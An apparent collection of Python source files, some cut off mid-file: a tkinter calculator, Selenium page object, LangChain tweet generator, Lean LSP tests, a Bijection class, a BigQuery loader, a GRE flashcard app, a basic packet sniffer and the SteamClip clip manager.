    "import tkinter as tk\r\nfrom tkinter import ttk\r\n\r\nclass Calculator:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.title(\"Calculator\")\r\n        self.root.geometry(\"300x400\")\r\n        self.root.resizable(False, False)\r\n        self.expression = \"\"\r\n        self.result_var = tk.StringVar()\r\n        self.result_var.set(\"0\")\r\n        self.create_widgets()\r\n\r\n    def create_widgets(self):\r\n        # Display Screen\r\n        display_frame = ttk.Frame(self.root, padding=10)\r\n        display_frame.pack(fill=tk.BOTH, expand=True)\r\n        display_label = ttk.Label(display_frame, textvariable=self.result_var, font=(\"Arial\", 30), anchor=\"e\")\r\n        display_label.pack(fill=tk.BOTH, expand=True)\r\n\r\n        # Buttons Frame\r\n        buttons_frame = ttk.Frame(self.root)\r\n        buttons_frame.pack(fill=tk.BOTH, expand=True)\r\n\r\n        # Button Layout\r\n        buttons = [\r\n            (\"C\", 1, 0), (\"/\", 1, 3),\r\n            (\"7\", 2, 0), (\"8\", 2, 1), (\"9\", 2, 2), (\"*\", 2, 3),\r\n            (\"4\", 3, 0), (\"5\", 3, 1), (\"6\", 3, 2), (\"-\", 3, 3),\r\n            (\"1\", 4, 0), (\"2\", 4, 1), (\"3\", 4, 2), (\"+\", 4, 3),\r\n            (\"0\", 5, 0), (\".\", 5, 1), (\"=\", 5, 2), (\"Del\", 5, 3)\r\n        ]\r\n\r\n        for (text, row, col) in buttons:\r\n            button = ttk.Button(buttons_frame, text=text, command=lambda t=text: self.button_click(t))\r\n            button.grid(row=row, column=col, sticky=\"nsew\", padx=5, pady=5)\r\n            buttons_frame.grid_columnconfigure(col, weight=1)\r\n            buttons_frame.grid_rowconfigure(row, weight=1)\r\n\r\n    def button_click(self, text):\r\n        if text == \"=\":\r\n            self.calculate()\r\n        elif text == \"C\":\r\n            self.clear()\r\n        elif text == \"Del\":\r\n            self.delete()\r\n        else:\r\n            self.expression += text\r\n            self.result_var.set(self.expression)\r\n\r\n    def calculate(self):\r\n        try:\r\n            result = str(eval(self.expression))\r\n            self.result_var.set(result)\r\n            self.expression = result\r\n        except Exception as e:\r\n            self.result_var.set(\"Error\")\r\n            self.expression = \"\"\r\n\r\n    def delete(self):\r\n        self.expression = self.expression[:-1]\r\n        self.result_var.set(self.expression if self.expression else \"0\")\r\n\r\n    def clear(self):\r\n        self.expression = \"\"\r\n        self.result_var.set(\"0\")\r\n\r\nif __name__ == \"__main__\":\r\n    root = tk.Tk()\r\n    app = Calculator(root)\r\n    root.mainloop()\r\n",
    "from selenium.webdriver.common.by import By\nfrom .POM import POM\n# from selenium.webdriver.support.ui import WebDriverWait\n# from selenium.webdriver.support import expected_conditions as EC\n\nclass Inventory_page(POM):\n    def __init__(self, driver):\n        super().__init__(driver)\n        # self.username_col = (By.ID, \"user-name\")\n        # self.password_col = (By.ID, \"password\")\n        # self.login_button = (By.ID, \"login-button\")\n        # self.login_error_alert = (By.CLASS_NAME, \"error-message-container.error\")\n        # self.login_error_msg = (By.XPATH, '//*[@id=\"login_button_container\"]/div/form/div[3]/h3/text()')\n        # self.login_error_alert_close_btn = (By.CLASS_NAME, \"error-button\")\n        # self.login_url = \"https://www.saucedemo.com/\"\n        self.title = (By.XPATH, '//*[@id=\"header_container\"]/div[2]/span')\n        self.item_list = (By.XPATH, '//*[@id=\"inventory_container\"]/div')\n\n\n    # def insert_username(self, username:str) -> None:\n    #     self.get(self.username_col).send_keys(username)\n    \n    # def insert_password(self, password:str) -> None:\n    #     self.get(self.password_col).send_keys(password)\n    \n    # def insert_credentials(self, username:str, password:str) -> None:\n    #     self.insert_username(username)\n    #     self.insert_password(password)\n    \n    # def login_as(self,username:str, password:str) -> None:\n    #     self.insert_credentials(username, password)\n    #     self.click_btn(self.login_button)",
    "import os\nfrom goose3.article import Article\nfrom langchain_openai import ChatOpenAI\nfrom langchain.prompts import PromptTemplate\nfrom pydantic import BaseModel, Field, ConfigDict\nfrom typing import Any, Literal\nfrom goose3 import Goose\n\nfrom ..logger import setup_logger\nfrom ..database.sql import SQLDatabase\n\nlogger = setup_logger(__name__)\n\nclass Tweet(BaseModel):\n    text: str = Field(..., description=\"The tweet text\")\n\nclass Thread(BaseModel):\n    tweets: list[Tweet] = Field(..., description=\"A list of tweets\")\n\nclass TweetCreator(BaseModel):\n    model_config = ConfigDict(arbitrary_types_allowed=True, extra='allow')\n    model_name: str = Field(default=\"gpt-4o\")\n    prompt_template: str = Field(default=...)\n\n    def model_post_init(self, __context: Any) -> None:\n        if 'deepseek' in self.model_name:\n            self.llm = ChatOpenAI(model='deepseek-chat', api_key=os.getenv(\"DEEPSEEK_API_KEY\"), base_url=\"https://api.deepseek.com\")\n        else:\n            self.llm = ChatOpenAI(model=self.model_name, api_key=os.getenv(\"OPENAI_API_KEY\"))\n        return self\n    \n    def _extract_article_from_link(self, link: str) -> Article:\n        g = Goose()\n        article = g.extract(url=link)\n        return article\n    \n    def _add_source_article(self, link: str | list[str]) -> str:\n        if isinstance(link, str):\n            try:\n                article = self._extract_article_from_link(link)\n                self.prompt_template = self.prompt_template.replace(\"{link}\", article.canonical_link)\n                self.prompt_template = self.prompt_template + f\"\\n\\nHere you can see the content of the original article:\\n{article.cleaned_text}\"\n                if article.links:\n                    self.prompt_template = self.prompt_template + f\"\\n\\nHere you can see the links related to the concept:\\n{article.links}\"\n                return self.prompt_template\n            except Exception as e:\n                logger.error(f\"Failed to extract article from link {link}: {e}\", exc_info=True)\n                return self.prompt_template\n        \n        # Handle list of links case\n        for single_link in link:\n            self._add_source_article(single_link)\n        return self.prompt_template\n    \n    def _add_similar_concepts(self, similar_concepts: list[dict]) -> str:\n        for similar_concept in similar_concepts:\n            self.prompt_template = self.prompt_template + f\"\\n\\nHere you can see a similar concept:\\n{similar_concept['document']}\"\n        return self.prompt_template\n\n    def generate_tweet(self, concept: dict, similar_concepts: list[dict], extra_instructions: str, type: Literal['tweet', 'thread'] = 'tweet') -> Tweet | Thread:\n        if extra_instructions:\n            self.prompt_template = self.prompt_template + f\"\\n\\nPay attention to the following:\\n{extra_instructions}\"\n        \n        if concept['links']:\n            self.prompt_template = self._add_source_article(concept['links'])\n        \n        if similar_concepts:\n            self.prompt_template = self._add_similar_concepts(similar_concepts)\n\n        prompt = PromptTemplate.from_template(self.prompt_template)\n        if type == 'tweet':\n            chain = prompt | self.llm.with_structured_output(Tweet)\n        else:\n            chain = prompt | self.llm.with_structured_output(Thread)\n        return chain.invoke(\n            {\n                \"concept_title\": concept['title'],\n                \"concept_text\": concept['concept_text'],\n                \"keywords\": concept['keywords'],\n                \"link\": concept['links']\n            }\n        )\n    ",
    "import os\nimport random\nfrom pprint import pprint\nimport time\nimport unittest\n\nfrom leanclient import DocumentContentChange\nfrom leanclient.base_client import BaseLeanLSPClient\nfrom leanclient.file_manager import LSPFileManager\n\nfrom leanclient.utils import apply_changes_to_text\nfrom tests.utils import (\n    read_stdout_timeout,\n    get_random_fast_mathlib_files,\n    get_random_mathlib_files,\n)\n\nfrom run_tests import FAST_MATHLIB_FILES, TEST_ENV_DIR\n\n\nclass WrappedFileManager(LSPFileManager, BaseLeanLSPClient):\n    def __init__(self, *args, **kwargs):\n        BaseLeanLSPClient.__init__(self, *args, **kwargs)\n        LSPFileManager.__init__(self)\n\n\nclass TestLSPFileManager(unittest.TestCase):\n    def setUp(self):\n        self.lsp = WrappedFileManager(\n            TEST_ENV_DIR, initial_build=False, print_warnings=False\n        )\n\n    def tearDown(self):\n        self.lsp.close()\n\n    def _test_open_files_bench(self):\n        \"\"\"Not a test. Used to find fast opening mathlib files.\"\"\"\n        paths = get_random_mathlib_files(4)\n\n        paths = FAST_MATHLIB_FILES\n\n        # Open files and benchmark each time\n        benchs = []\n        for path in paths:\n            t0 = time.time()\n            print(f\"Opening {path}\")\n            self.lsp.open_file(path)\n            benchs.append([time.time() - t0, path])\n\n        benchs.sort()\n        disp = [f'\"{b[1]}\", # {b[0]:.2f}s' for b in benchs]\n        print(\"\\n\".join(disp))\n\n    def test_open_files(self):\n        paths = get_random_fast_mathlib_files(3)\n        diag = self.lsp.open_file(paths[0])\n        diag2 = self.lsp.open_file(paths[0])  # One file overlap\n        diags = self.lsp.open_files(paths[:2])  # Two files, 1 overlap\n        diags2 = self.lsp.open_files(paths[:2])  # Cache\n\n        self.assertEqual(diag, diag2)\n        self.assertEqual(diag, diags[0])\n        self.assertEqual(diags, diags2)\n\n    def test_file_update(self):\n        path = get_random_fast_mathlib_files(1, 42)[0]\n        diags = self.lsp.open_file(path)\n        assert len(diags) <= 1, f\"Expected 0 or 1 diagnostics, got {len(diags)}\"\n\n        # Make some random changes\n        # random.seed(6.28)\n        NUM_CHANGES = 16\n        changes = []\n        t0 = time.time()\n        text = self.lsp.get_file_content(path)\n        for _ in range(NUM_CHANGES):\n            line = random.randint(10, 50)\n            d = DocumentContentChange(\n                \"inv#lid\\n\", [line, random.randint(0, 4)], [line, random.randint(4, 8)]\n            )\n            changes.append(d)\n            text = apply_changes_to_text(text, [d])\n        diags2 = self.lsp.update_file(path, changes)\n\n        if len(diags2) == 1:\n            self.assertEqual(diags2[0][\"message\"], \"unterminated comment\")\n        else:\n            self.assertTrue(\n                len(diags2) >= NUM_CHANGES // 2,\n                f\"Expected {NUM_CHANGES // 2} diagnostics got {len(diags2)}:\\n\\n{diags2}\\n\\n\",\n            )\n        print(f\"Updated {len(changes)} changes in one call: {(time.time() - t0):.2f} s\")\n\n        new_text = self.lsp.get_file_content(path)\n        self.assertEqual(text, new_text)\n\n        # Rerun with the altered text and compare diagnostics\n        fpath = path.replace(\".lean\", \"_test.lean\")\n        with open(TEST_ENV_DIR + fpath, \"w\") as f:\n            f.write(text)\n        diags3 = self.lsp.open_file(fpath)\n        os.remove(TEST_ENV_DIR + fpath)\n\n        self.assertEqual(diags2, diags3)\n\n        self.lsp.close_files([path])\n\n    def test_file_update_line_by_line(self):\n        NUM_LINES = 24\n        path = \".lake/packages/mathlib/Mathlib/NumberTheory/FLT/Basic.lean\"\n        # path = \".lake/packages/mathlib/Mathlib/AlgebraicTopology/DoldKan/Degeneracies.lean\"\n        # path = \".lake/packages/mathlib/Mathlib/FieldTheory/Galois/GaloisClosure.lean\"\n\n        with open(TEST_ENV_DIR + path, \"r\") as f:\n            lines = f.readlines()\n        START = len(lines) - NUM_LINES\n\n        fantasy = \"Fantasy.lean\"\n        fantasy_path = TEST_ENV_DIR + fantasy\n        text = \"\".join(lines[:START])\n        with open(fantasy_path, \"w\") as f:\n            f.write(text)\n\n        self.lsp.open_file(fantasy)\n\n        lines = lines[-NUM_LINES:]\n        t0 = time.time()\n        diagnostics = []\n        for i, line in enumerate(lines):\n            text += line\n            diag = self.lsp.update_file(\n                fantasy,\n                [DocumentContentChange(line, [i + START, 0], [i + START, len(line)])],\n            )\n            content = self.lsp.get_file_content(fantasy)\n            self.assertEqual(content, text)\n            diagnostics.extend(diag)\n\n        self.assertTrue(len(diagnostics) > NUM_LINES / 2)\n        # self.assertEqual(len(diag), 0)\n        speed = len(lines) / (time.time() - t0)\n        os.remove(fantasy_path)\n        print(f\"Updated {len(lines)} lines one by one: {speed:.2f} lines/s\")\n\n        self.lsp.close_files([fantasy, path])\n\n    def test_update_file_mathlib(self):\n        files = [\n            \".lake/packages/mathlib/Math",
    "from typing import Generic, TypeVar, Dict, Hashable, Iterator\nfrom dataclasses import dataclass\n\nT1 = TypeVar('T1', bound=Hashable)\nT2 = TypeVar('T2', bound=Hashable)\n\n@dataclass\nclass Bijection(Generic[T1, T2]):\n    \"\"\"\n    A class to maintain a bijective mapping between two hashable types T1 and T2.\n    \"\"\"\n    _forward: dict[T1, T2]\n    _backward: dict[T2, T1]\n\n    @staticmethod\n    def new() -> 'Bijection[T1, T2]':\n        return Bijection({}, {})\n\n    def add(self, key: T1, value: T2) -> None:\n        \"\"\"\n        Add a bijective mapping between `key` and `value`.\n\n        Raises:\n            ValueError: If either `key` or `value` is already mapped.\n        \"\"\"\n        if key in self._forward:\n            raise ValueError(f\"Key {key} is already mapped to {self._forward[key]}\")\n        if value in self._backward:\n            raise ValueError(f\"Value {value} is already mapped to {self._backward[value]}\")\n        \n        self._forward[key] = value\n        self._backward[value] = key\n\n    def remove_by_key(self, key: T1) -> None:\n        \"\"\"\n        Remove the mapping using the `key`.\n        \n        Raises:\n            KeyError: If the `key` does not exist.\n        \"\"\"\n        if key not in self._forward:\n            raise KeyError(f\"Key {key} does not exist in the mapping\")\n        \n        value = self._forward.pop(key)\n        self._backward.pop(value)\n\n    def remove_by_value(self, value: T2) -> None:\n        \"\"\"\n        Remove the mapping using the `value`.\n        \n        Raises:\n            KeyError: If the `value` does not exist.\n        \"\"\"\n        if value not in self._backward:\n            raise KeyError(f\"Value {value} does not exist in the mapping\")\n        \n        key = self._backward.pop(value)\n        self._forward.pop(key)\n\n    def get_value(self, key: T1) -> T2:\n        \"\"\"\n        Get the value mapped to the given `key`.\n        \n        Raises:\n            KeyError: If the `key` does not exist.\n        \"\"\"\n        if key not in self._forward:\n            raise KeyError(f\"Key {key} does not exist in the mapping\")\n        return self._forward[key]\n\n    def get_key(self, value: T2) -> T1:\n        \"\"\"\n        Get the key mapped to the given `value`.\n        \n        Raises:\n            KeyError: If the `value` does not exist.\n        \"\"\"\n        if value not in self._backward:\n            raise KeyError(f\"Value {value} does not exist in the mapping\")\n        return self._backward[value]\n    \n    def has_key(self, key: T1) -> bool:\n        return key in self._forward\n    \n    def has_value(self, value: T2) -> bool:\n        return value in self._backward\n    \n    def items(self) -> Iterator[tuple[T1, T2]]:\n        return self._forward.items()\n\n    def __contains__(self, item: T1 | T2) -> bool:\n        \"\"\"\n        Check if `item` exists in either the keys or the values of the mapping.\n        \"\"\"\n        return item in self._forward or item in self._backward\n\n    def __len__(self) -> int:\n        \"\"\"\n        Return the number of mappings.\n        \"\"\"\n        return len(self._forward)\n\n    def __repr__(self) -> str:\n        \"\"\"\n        String representation of the bijection.\n        \"\"\"\n        return f\"Bijection({self._forward})\"",
    "import os\nimport logging\nimport pandas as pd\n\nfrom authentication import authenticate\nfrom dataform_api import list_workflow_invocations, query_invocation_actions\nfrom bigquery_client import (\n    get_bigquery_client,\n    get_processed_invocations,\n    load_to_bigquery,\n    create_all_views\n)\nfrom utils import setup_logging\n\n\ndef main() -> None:\n\n    setup_logging()\n    logger = logging.getLogger(__name__)\n\n    # Fetch required environment variables\n    service_account_json = os.getenv(\"GCP_SERVICE_ACCOUNT_JSON\")\n    project_id = os.getenv(\"PROJECT_ID\")\n    location = os.getenv(\"LOCATION\")\n    repository_id = os.getenv(\"REPOSITORY_ID\")\n\n    # Validate environment variables\n    required_env_vars = [\"GCP_SERVICE_ACCOUNT_JSON\", \"PROJECT_ID\", \"LOCATION\", \"REPOSITORY_ID\"]\n    missing_env_vars = [var for var in required_env_vars if not os.getenv(var)]\n    if missing_env_vars:\n        logger.error(f\"Missing required environment variables: {', '.join(missing_env_vars)}\")\n        return\n\n    logger.info(\"All required environment variables are set.\")\n\n    # Authenticate with GCP\n    try:\n        token, credentials = authenticate(service_account_json)\n        logger.info(\"Authentication successful.\")\n    except Exception:\n        logger.error(\"Exiting due to authentication failure.\")\n        return\n\n    headers = {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n\n    # Initialize BigQuery client\n    try:\n        logger.info(\"Initializing BigQuery client.\")\n        bq_client = get_bigquery_client(credentials, project_id)\n    except Exception as exc:\n        logger.error(f\"Failed to initialize BigQuery client: {exc}\")\n        return\n\n    # Fully qualified table name\n    table_fqdn = f\"{project_id}.dataform_assguard.assertion_data\"\n\n    # Fetch previously processed invocation names\n    try:\n        processed_invocations = get_processed_invocations(bq_client, table_fqdn)\n    except Exception as exc:\n        logger.error(f\"Exiting due to failure in fetching processed Invocation_Name: {exc}\")\n        return\n\n    # Fetch all workflow invocations\n    try:\n        workflow_invocations = list_workflow_invocations(project_id, location, repository_id, headers)\n        if not workflow_invocations:\n            logger.info(\"No workflow invocations found. Exiting script.\")\n            return\n    except Exception as exc:\n        logger.error(f\"Failed to list workflow invocations: {exc}\")\n        return\n\n    # Collect assertion data for new invocations\n    assertion_data = []\n    for invocation in workflow_invocations:\n        invocation_name = invocation.get(\"name\", \"N/A\")\n\n        # Skip if this invocation has already been processed\n        if invocation_name in processed_invocations:\n            logger.info(f\"Invocation {invocation_name} already processed. Skipping.\")\n            continue\n\n        logger.info(f\"Processing Invocation: {invocation_name}\")\n        try:\n            actions = query_invocation_actions(invocation_name, headers)\n            if not actions:\n                logger.warning(f\"No actions found for invocation: {invocation_name}\")\n                continue\n        except Exception as exc:\n            logger.error(f\"Failed to query actions for invocation {invocation_name}: {exc}\")\n            continue\n\n        # Gather only assertion-related actions\n        for action in actions:\n            action_name = action.get(\"target\", {}).get(\"name\", \"\")\n            if \"assertion\" not in action_name.lower():\n                continue\n\n            start_time = action.get(\"invocationTiming\", {}).get(\"startTime\")\n            end_time = action.get(\"invocationTiming\", {}).get(\"endTime\")\n            target_info = action.get(\"target\", {})\n            database = target_info.get(\"database\", \"N/A\")\n            schema = target_info.get(\"schema\", \"N/A\")\n            state = action.get(\"state\", \"UNKNOWN\")\n            failure_reason = action.get(\"failureReason\", \"N/A\") if state == \"FAILED\" else \"N/A\"\n\n            logger.info(f\"  - Found assertion action: {action_name} with state: {state}\")\n\n            assertion_data.append({\n                \"Start_Time\": start_time,\n                \"End_Time\": end_time,\n                \"Invocation_Name\": invocation_name,\n                \"Action_Name\": action_name,\n                \"Database\": database,\n                \"Schema\": schema,\n                \"State\": state,\n                \"Failure_Reason\": failure_reason\n            })\n\n    # Exit early if we have no new assertion data\n    df = pd.DataFrame(assertion_data)\n    if df.empty:\n        logger.info(\"No new assertion data found in this run. Exiting script.\")\n        return\n\n    # Convert timestamps to proper datetime\n    if \"Start_Time\" in df.columns:\n        logger.info(\"Converting column Start_Time to datetime.\")\n        df[\"Start_Time\"] = (\n            pd.to_datetime(df[\"Start_Time\"], errors=\"coerce\")\n              .dt.tz_localize(None)\n              .dt.round(\"us\")\n        )\n\n    if \"End_Time\" in df.columns:\n        logger.inf",
    "import tkinter as tk\nfrom tkinter import simpledialog, messagebox\nimport random\nimport argparse\nimport re\nimport pandas as pd\nimport openai\nfrom dotenv import load_dotenv\nimport os\nimport epitran\nimport sys\n\n\nload_dotenv()\nif getattr(sys, 'frozen', False):\n    # If running as a PyInstaller bundle\n    base_path = sys._MEIPASS\nelse:\n    # If running as a script\n    base_path = os.path.dirname(__file__)\n\n\n# Flashcard App\nclass FlashcardApp:\n    def __init__(self, root, flashcards):\n        self.root = root\n        self.flashcards = flashcards\n        self.original_flashcards = list(flashcards)  # Store the original order\n        self.index = 0\n        self.showing_back = False\n        self.is_shuffled = False  # Track shuffle state\n\n        # CHATGPT\n        openai.api_key = os.getenv(\"OPENAI_API_KEY\")\n\n        # Initialize the UI\n        self.setup_ui()\n\n        # Bind all necessary keys\n        self.bind_keys()\n\n        # Display the first card\n        self.show_front()\n\n    def setup_ui(self):\n        self.root.title(\"Worder\")\n        self.root.geometry(\"600x400\")\n\n        # Flashcard display\n        self.card_frame = tk.Frame(root, bg=\"white\", bd=2, relief=\"ridge\")\n        self.card_frame.pack(expand=True, fill=\"both\", padx=20, pady=20)\n\n        self.word_label = tk.Label(self.card_frame, text=\"\", font=(\"Helvetica\", 32, \"bold\"), fg=\"blue\", bg=\"white\")\n        self.word_label.pack(pady=(5,0))\n\n        self.pos_label = tk.Label(self.card_frame, text=\"\", font=(\"Helvetica\", 18), bg=\"white\")\n        self.pos_label.pack(pady=(0, 2))  # Slightly reduce the padding for part of speech\n\n        self.example_label = tk.Label(self.card_frame, text=\"\", font=(\"Helvetica\", 14), wraplength=500, bg=\"white\")\n        self.example_label.pack(pady=20)\n\n        # Card number display (bottom-right corner)\n        self.card_number_label = tk.Label(root, text=\"\", font=(\"Helvetica\", 10, \"italic\"))\n        self.card_number_label.place(relx=0.95, rely=0.95, anchor=\"se\")\n        # self.card_number_label.pack()\n\n        # Shuffle Button\n        self.shuffle_button = tk.Button(root, text=\"Shuffle\", command=self.toggle_shuffle, font=(\"Helvetica\", 14))\n        self.shuffle_button.pack(pady=10)\n\n        self.update_card_number()  # Initial display of card number\n\n        # Example text display using a Text widget for highlighting\n        # self.example_text = tk.Text(self.card_frame, font=(\"Helvetica\", 14), wrap=\"word\", height=4, width=60, bg=\"white\", bd=0)\n        self.example_text = tk.Text(\n            self.card_frame, \n            font=(\"Helvetica\", 14), \n            wrap=\"word\", \n            height=4, \n            width=60, \n            bg=\"white\", \n            bd=0,              # Remove border\n            highlightthickness=0  # Remove the highlight border\n        )\n        self.example_text.config(state=\"disabled\")  # Disable editing\n        self.example_text.tag_configure(\"highlight\", font=(\"Helvetica\", 14, \"bold\"), foreground=\"blue\")\n        self.example_text.pack(expand=True, fill=\"both\", pady=(5,5))\n        \n        # Pronunciation\n        self.pronunciation_label = tk.Label(self.card_frame, text=\"\", font=(\"Helvetica\", 16, \"italic\"), bg=\"white\")\n        self.pronunciation_label.pack(pady=(2, 5))  # Position right below the part of speech\n\n        # Add a search entry and button\n        self.search_label = tk.Label(root, text=\"Search:\", font=(\"Helvetica\", 11))\n        self.search_label.place(relx=0.01, rely=0.95, anchor=\"sw\")\n\n        self.search_entry = tk.Entry(root, font=(\"Helvetica\", 12), width=15)\n        self.search_entry.place(relx=0.1, rely=0.95, anchor=\"sw\")\n\n\n    def bind_keys(self):\n        # Key bindings for left and right arrows\n        self.root.bind(\"<Left>\", self.prev_card_key)\n        self.root.bind(\"<Right>\", self.next_card_key)\n\n        # Key binding for Spacebar to flip the card\n        self.root.bind(\"<space>\", self.flip_card_key)\n\n        # GPT generated question\n        self.root.bind(\"<Control-g>\", self.generate_gre_question_key)\n\n        # History of generated question\n        self.root.bind(\"<Control-z>\", self.show_stored_gre_question)\n        \n        # GPT generated word example\n        self.root.bind(\"<Control-e>\", lambda event: self.generate_gre_example())\n        self.root.bind(\"<Control-q>\", self.show_stored_gre_examples)\n\n        # Search word\n        self.root.bind(\"<Control-f>\", lambda event: self.focus_search())\n        self.root.bind(\"<Return>\", lambda event: self.search_flashcard())\n        self.search_entry.bind(\"<Control-a>\", self.select_all_search_text)\n\n        # GPT word root\n        self.root.bind(\"<Control-space>\", self.show_word_root)\n\n        # Choose dataset\n        self.root.bind(\"<Control-p>\", self.show_dataset_popup)\n\n        # Set Openai API KEY\n        self.root.bind(\"<Control-l>\", self.set_api_key)\n\n    def show_front(self):\n        self.showing_back = False\n        card = self.flashcards[self.index]\n\n        # Update the word and part of speech\n        self.word_label.config",
    "import socket\nimport struct\nimport textwrap\nimport datetime\n\n# Function to format multi-line data\ndef format_multi_line(prefix, string, size=80):\n    size -= len(prefix)\n    if isinstance(string, bytes):\n        string = ''.join(f'{byte:02x}' for byte in string)\n    return '\\n'.join([prefix + line for line in textwrap.wrap(string, size)])\n\n# Main sniffer function\ndef main():\n    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    print(\"[+] Listening for incoming packets...\")\n    log_file = open('packet_log.txt', 'a')\n    \n    try:\n        while True:\n            raw_data, addr = conn.recvfrom(65536)\n            dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)\n            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n            log_entry = f'[{timestamp}] Ethernet Frame: Destination: {dest_mac}, Source: {src_mac}, Protocol: {eth_proto}\\n'\n            print(log_entry.strip())\n            log_file.write(log_entry)\n            \n            # IPv4 Packet\n            if eth_proto == 8:\n                version, header_length, ttl, proto, src, target, data = ipv4_packet(data)\n                ipv4_entry = f'    IPv4 Packet: Version: {version}, Header Length: {header_length}, TTL: {ttl}, Protocol: {proto}, Source: {src}, Target: {target}\\n'\n                print(ipv4_entry.strip())\n                log_file.write(ipv4_entry)\n    \n    except KeyboardInterrupt:\n        print(\"\\n[!] Stopping the sniffer.\")\n        log_file.close()\n        conn.close()\n\n# Unpack Ethernet Frame\ndef ethernet_frame(data):\n    dest_mac, src_mac, proto = struct.unpack('! 6s 6s H', data[:14])\n    return get_mac_addr(dest_mac), get_mac_addr(src_mac), socket.htons(proto), data[14:]\n\ndef get_mac_addr(bytes_addr):\n    return ':'.join(map('{:02x}'.format, bytes_addr))\n\n# Unpack IPv4 Packet\ndef ipv4_packet(data):\n    version_header_length = data[0]\n    version = version_header_length >> 4\n    header_length = (version_header_length & 15) * 4\n    ttl, proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])\n    return version, header_length, ttl, proto, ipv4(src), ipv4(target), data[header_length:]\n\ndef ipv4(addr):\n    return '.'.join(map(str, addr))\n\nif __name__ == '__main__':\n    main()\n",
    "#!/usr/bin/env python3\n\nimport os\nimport sys\nimport subprocess\nimport json\nimport bz2\nimport imageio_ffmpeg as iio\nfrom PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,\n                             QPushButton, QLabel, QGridLayout,\n                             QFrame, QComboBox, QDialog, QTableWidget,\n                             QTableWidgetItem, QSizePolicy, QHeaderView,\n                             QMessageBox, QFileDialog)\nfrom PyQt5.QtGui import QPixmap, QIcon\nfrom PyQt5.QtCore import Qt\nfrom datetime import datetime\nimport webbrowser\n\nclass SteamClipApp(QWidget):\n    CONFIG_DIR = os.path.expanduser(\"~/.config/SteamClip\")\n    CONFIG_FILE = os.path.join(CONFIG_DIR, 'SteamClip.conf')\n    GAME_IDS_FILE = os.path.join(CONFIG_DIR, 'GameIDs.txt')\n    GAME_IDS_BZ2_FILE = os.path.join(CONFIG_DIR, 'GameIDs.txt.bz2')\n    STEAM_API_URL = \"https://api.steampowered.com/ISteamApps/GetAppList/v2/\"\n    CURRENT_VERSION = \"v2.8.1\"\n\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"SteamClip\")\n        self.setGeometry(100, 100, 900, 600)\n\n        self.clip_index = 0\n        self.clip_folders = []\n        self.original_clip_folders = []\n        self.game_ids = {}\n\n        self.default_dir = self.check_and_load_userdata_folder()\n        self.load_game_ids()\n        self.setup_ui()\n        self.populate_steamid_dirs()\n        self.check_for_updates_at_startup()\n\n    def check_for_updates_at_startup(self):\n        version_file_path = os.path.join(self.CONFIG_DIR, 'Version.txt')\n        if not os.path.exists(version_file_path):\n            with open(version_file_path, 'w') as version_file:\n                version_file.write(self.CURRENT_VERSION)\n        else:\n            with open(version_file_path, 'r') as version_file:\n                file_version = version_file.read().strip()\n            if file_version != self.CURRENT_VERSION:\n                with open(version_file_path, 'w') as version_file:\n                    version_file.write(self.CURRENT_VERSION)\n        self.check_for_updates()\n\n    def check_for_updates(self):\n        version_file_path = os.path.join(self.CONFIG_DIR, 'Version.txt')\n        with open(version_file_path, 'r') as version_file:\n            file_version = version_file.read().strip()\n        latest_release = self.get_latest_release_from_github()\n        if latest_release and latest_release != file_version:\n            self.prompt_update()\n\n    def get_latest_release_from_github(self):\n        url = \"https://api.github.com/repos/Nastas95/SteamClip/releases/latest\"\n        command = ['curl', '-s', url]\n        try:\n            result = subprocess.run(command, capture_output=True, check=True, text=True)\n            latest_release_info = json.loads(result.stdout)\n            return latest_release_info['tag_name']\n        except subprocess.CalledProcessError as e:\n            print(f\"Error fetching latest release: {e}\")\n            return None\n        except json.JSONDecodeError as e:\n            print(f\"Error decoding JSON: {e}\")\n            return None\n\n    def prompt_update(self):\n        reply = QMessageBox.question(self, \"Update Available\", \"A new update is available. Update now?\", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)\n        if reply == QMessageBox.Yes:\n            webbrowser.open(\"https://github.com/Nastas95/SteamClip/releases/latest\")\n\n    def check_and_load_userdata_folder(self):\n        if not os.path.exists(self.CONFIG_FILE):\n            return self.prompt_steam_version_selection()\n        with open(self.CONFIG_FILE, 'r') as f:\n            userdata_path = f.read().strip()\n        return userdata_path if os.path.isdir(userdata_path) else self.prompt_steam_version_selection()\n\n    def prompt_steam_version_selection(self):\n        dialog = SteamVersionSelectionDialog(self)\n        while dialog.exec_() == QDialog.Accepted:\n            selected_option = dialog.get_selected_option()\n            if selected_option == \"Standard\":\n                userdata_path = os.path.expanduser(\"~/.local/share/Steam/userdata\")\n            elif selected_option == \"Flatpak\":\n                userdata_path = os.path.expanduser(\"~/.var/app/com.valvesoftware.Steam/data/Steam/userdata\")\n            elif os.path.isdir(selected_option):\n                userdata_path = selected_option\n            else:\n                continue\n            if os.path.isdir(userdata_path):\n                self.save_default_directory(userdata_path)\n                return userdata_path\n            else:\n                QMessageBox.warning(self, \"Invalid Directory\", \"The selected directory is not valid. Please select again.\")\n        return None\n\n    def save_default_directory(self, directory):\n        os.makedirs(self.CONFIG_DIR, exist_ok=True)\n        with open(self.CONFIG_FILE, 'w') as f:\n            f.write(directory)\n\n    def load_game_ids(self):\n        if not os.path.exists(self.GAME_IDS_BZ2_FILE):\n            QMessageBox.information(self, \"Info\", \"SteamClip will now try to downl",
